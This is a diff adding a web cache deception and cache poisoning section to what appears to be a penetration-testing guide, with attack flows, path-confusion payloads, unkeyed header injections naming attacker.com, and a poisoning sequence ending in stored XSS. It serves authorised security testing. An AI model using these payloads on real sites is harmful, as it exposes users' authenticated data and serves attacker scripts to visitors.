@@ -1243,3 +1243,78 @@ Admin credentials / cross-tenant: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H = 9.6
 - [ ] Purge all test cache entries via CDN API or wait for TTL
 - [ ] Verify canary no longer appears in cached responses
 - [ ] Restore Account A profile to pre-test state
+
+
+---
+
+## From hack-skills: Web Cache Deception & Cache Poisoning
+
+### Cache Deception Attack Flow
+
+**Goal**: Trick cache into storing authenticated user's response, then retrieve it unauthenticated.
+
+```
+1. Attacker sends victim a crafted URL:
+   https://target.com/account/profile/nonexistent.css
+   
+2. Victim visits URL while authenticated:
+   - App: ignores .css suffix, serves /account/profile (authenticated response)
+   - CDN: sees .css extension → caches the response
+   
+3. Attacker visits same URL unauthenticated:
+   - CDN: returns cached response (victim's authenticated data!)
+```
+
+**Verification**: Check `X-Cache: HIT` on unauthenticated follow-up request.
+
+### Path Confusion Techniques
+
+```
+# Static extension append:
+/account/profile/x.css
+/account/profile/x.js
+/account/profile/x.png
+
+# Semicolon delimiter confusion:
+/account/profile;.css     → app sees /account/profile, CDN sees .css extension
+
+# URL-encoded slash:
+/account/profile%2F.css   → different normalization by app vs CDN
+
+# Query string with extension:
+/account/profile?cb=x.css
+```
+
+### Finding Unkeyed Cache Inputs
+
+Headers NOT in cache key (CDN ignores them, server reflects them):
+```
+X-Forwarded-Host: injected.attacker.com   → Host header poisoning
+X-Forwarded-Scheme: http                   → Force HTTP redirect
+X-Original-URL: /admin                     → Path override (Nginx/Drupal)
+X-Rewrite-URL: /admin                      → Path override (IIS)
+```
+
+### Cache Poisoning via X-Forwarded-Host
+
+```
+1. Send request with:
+   GET / HTTP/1.1
+   Host: target.com
+   X-Forwarded-Host: attacker.com
+
+2. If response reflects "attacker.com" in URLs or scripts
+   → CDN caches the page with attacker domain
+
+3. All subsequent users receiving cached response load scripts from attacker.com
+   → Stored XSS for all visitors
+```
+
+### Path Normalization Differential (CDN vs App)
+
+| Payload | CDN Sees | App Sees |
+|---|---|---|
+| `/profile/..%2F..%2Fadmin` | `/profile/../../admin` | `/admin` |
+| `/profile;.css` | `/profile` (w/ `.css`) | `/profile;.css` |
+| `/profile/.css` | static (`.css`) | `/profile/.css` |
+| `/api/users%0A.js` | static (`.js`) | `/api/users` (after decode) |
